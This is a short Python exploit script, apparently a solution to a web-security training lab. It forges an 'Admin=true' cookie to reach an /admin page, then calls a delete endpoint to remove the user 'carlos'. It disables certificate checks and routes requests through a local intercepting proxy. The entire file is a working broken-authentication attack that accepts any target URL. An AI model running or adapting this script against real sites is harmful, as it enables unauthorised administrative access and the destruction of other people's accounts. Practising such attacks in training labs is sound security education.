import requests
import sys
import re
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}

def broken_authentification_exploit(session, url) :
    admin_url = url+"/admin"
    cookies = {"Admin":"true"}
    r = session.get(admin_url, cookies=cookies, verify=False, proxies=proxies)
    
    if "Admin panel" in r.text :
        
        print("(+) You have successfully access to the admin page!")
        delete_url = url + "/admin/delete?username=carlos"
        r = session.get(delete_url, cookies=cookies, verify=False, proxies=proxies)
        
        if "User deleted successfully!" in r.text :
            print("(+) The carlos user has been deleted successfully!")
        else :
            print("(-) Could not delete the carlos user!")
    else :
        print("(-) Failed to access the admin page!")

if __name__ == "__main__" :
    try :
        url = sys.argv[1].strip()
    except IndexError :
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)
        
    session = requests.Session()
    broken_authentification_exploit(session, url)